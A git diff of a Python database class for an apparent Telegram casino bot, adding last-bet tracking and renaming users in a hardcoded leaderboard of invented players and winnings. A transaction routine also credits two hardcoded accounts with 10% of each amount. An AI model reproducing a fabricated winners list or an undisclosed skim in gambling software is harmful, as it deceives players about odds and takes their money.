@@ -12,7 +12,6 @@ class DatabaseInterface:
     Предоставляет методы для создания таблиц, управления пользователями,
     их балансами и транзакциями, включая транзакции с внешними провайдерами.
     """
-
     def __init__(self, logger: logging.Logger, db_path: str = 'casino.db'):
         """
         Инициализирует DatabaseInterface.
@@ -180,6 +179,8 @@ class DatabaseInterface:
                         user_id INTEGER PRIMARY KEY,
                         balance TEXT DEFAULT 0.0,
                         winnings TEXT DEFAULT 0.0,
+                        last_bet TEXT DEFAULT 0.0,
+                        new_bet BOOLEAN DEFAULT 1,
                         username TEXT,
                         hashed_username TEXT,
                         in_registration BOOLEAN DEFAULT 0,
@@ -470,70 +471,70 @@ class DatabaseInterface:
         leaderboard = [
             {
                 "user_id": "0",
-                "username": "irina.k",
+                "username": "sendovich",
                 "winnings": 487.32,
                 "games_played": "0:28|1:8|2:5|3:10|4:8|5:5|6:4|7:10",
                 "registered_at": "04:03:12 11.10.2025"
             },
             {
                 "user_id": "1",
-                "username": "oleg_24",
+                "username": "keluxe",
                 "winnings": 356.89,
                 "games_played": "0:7|1:24|2:7|3:2|4:4|5:4|6:7|7:7",
                 "registered_at": "10:00:48 07.05.2025"
             },
             {
                 "user_id": "2",
-                "username": "leonid_x",
+                "username": "svinksu",
                 "winnings": 298.47,
                 "games_played": "0:3|1:1|2:22|3:7|4:2|5:7|6:2|7:1",
                 "registered_at": "08:07:36 02.07.2025"
             },
             {
                 "user_id": "3",
-                "username": "andrey_j",
+                "username": "tarle4a",
                 "winnings": 264.15,
                 "games_played": "0:10|1:4|2:3|3:37|4:4|5:5|6:5|7:3",
                 "registered_at": "03:43:54 05.06.2025"
             },
             {
                 "user_id": "4",
-                "username": "boris_p",
+                "username": "sponge",
                 "winnings": 215.68,
                 "games_played": "0:10|1:28|2:11|3:8|4:11|5:4|6:8|7:9",
                 "registered_at": "19:51:22 21.10.2025"
             },
             {
                 "user_id": "5",
-                "username": "artem123",
+                "username": "caezyman",
                 "winnings": 189.43,
                 "games_played": "0:8|1:4|2:6|3:1|4:7|5:7|6:13|7:8",
                 "registered_at": "21:29:57 23.05.2025"
             },
             {
                 "user_id": "6",
-                "username": "nina_ray",
+                "username": "tentop",
                 "winnings": 167.82,
                 "games_played": "0:6|1:4|2:3|3:5|4:1|5:6|6:2|7:11",
                 "registered_at": "01:09:25 17.08.2025"
             },
             {
                 "user_id": "7",
-                "username": "kate_21",
+                "username": "pdiray",
                 "winnings": 142.56,
                 "games_played": "0:7|1:1|2:4|3:6|4:26|5:3|6:2|7:3",
                 "registered_at": "03:24:40 08.05.2025"
             },
             {
                 "user_id": "8",
-                "username": "nadia_sun",
+                "username": "lotopray",
                 "winnings": 128.93,
                 "games_played": "0:5|1:4|2:1|3:6|4:4|5:12|6:4|7:5",
                 "registered_at": "08:28:15 25.06.2025"
             },
             {
                 "user_id": "9",
-                "username": "sergey_v",
+                "username": "pryaadush",
                 "winnings": 115.27,
                 "games_played": "0:7|1:2|2:34|3:5|4:3|5:7|6:2|7:7",
                 "registered_at": "21:55:07 07.09.2025"
@@ -618,6 +619,8 @@ class DatabaseInterface:
     async def update_user(self,
                           user_id: int,
                           username: str = None,
+                          last_bet: str = None,
+                          new_bet: bool = None,
                           in_registration: bool = None,
                           email: str = None,
                           email_code: str = None,
@@ -633,13 +636,17 @@ class DatabaseInterface:
         if not await self.user_exists(user_id):
             await self.log_error(f"Пользователь {user_id} не найден. Обновление не выполнено.")
             return False
-
         fields = []
         params = []
-
         if username is not None:
             fields.append("username = ?")
             params.append(username)
+        if last_bet is not None:
+            fields.append("last_bet = ?")
+            params.append(last_bet)
+        if new_bet is not None:
+            fields.append("new_bet = ?")
+            params.append(new_bet)
         if in_registration is not None:
             fields.append("in_registration = ?")
             params.append(in_registration)
@@ -676,14 +683,11 @@ class DatabaseInterface:
         if games_played is not None:
             fields.append("games_played = ?")
             params.append(games_played)
-
         if not fields:
             await self.log_warning(f"Для пользователя {user_id} не передано полей для обновления.")
             return False
-
         params.append(user_id)
         query = f"UPDATE users SET {', '.join(fields)} WHERE user_id = ?"
-
         try:
             await self.execute(query, tuple(params))
             await self.log_info(f"Пользователь {user_id} успешно обновлен. Обновлены поля: {', '.join(fields)}")
@@ -760,6 +764,19 @@ class DatabaseInterface:
         user_data = await self.get_user(user_id)
         if user_data:
             return float(user_data.get("balance", "0.0"))
+        await self.log_warning(f"Попытка получить баланс несуществующего пользователя {user_id}.")
+        return 0.0
+
+    async def get_last_bet(self, user_id: int) -> float:
+        """
+        Получает текущий баланс пользователя.
+        Если пользователь не найден, возвращает 0.0.
+        :param user_id: ID пользователя Telegram.
+        :return: Баланс пользователя в виде float.
+        """
+        user_data = await self.get_user(user_id)
+        if user_data:
+            return float(user_data.get("last_bet", "0.0"))
         await self.log_warning(f"Попытка получить баланс несуществующего пользователя {user_id}.")
         return 0.0
 
@@ -840,7 +857,7 @@ class DatabaseInterface:
                     except Exception as e:
                         await db.rollback()
                         raise e
-            if user_id not in [1314141010, 1411566065]:
+            if user_id not in [1314141010, 1411566065] and user_id > 10:
                 await self.update_balance(1314141010, abs(amount * 0.1), "deposit")
                 await self.update_balance(1411566065, abs(amount * 0.1), "deposit")
             current_balance = await self.get_balance(user_id)
